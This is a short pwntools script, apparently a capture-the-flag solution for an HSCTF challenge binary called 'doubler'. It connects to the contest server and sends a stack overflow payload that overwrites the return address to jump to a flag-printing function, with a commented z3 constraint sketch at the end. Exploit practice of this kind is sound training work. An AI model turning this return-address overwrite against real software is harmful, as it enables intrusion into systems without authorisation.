
# -- coding: utf-8 --
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
# ENV
e = context.binary = ELF('./doubler')
lib = e.libc
# r = e.process()
r=remote("doubler.hsctf.com", 1337)

# VARIABLE
flag=0x4011D2
# payload
pause()
payload =b"b"*0x20+flat(0xdeadbeef, flag)
r.sendline(payload)

r.interactive()

# x= BitVec('x', 32)
# solve(x > 0, x*2 == -100)

# 140737488355278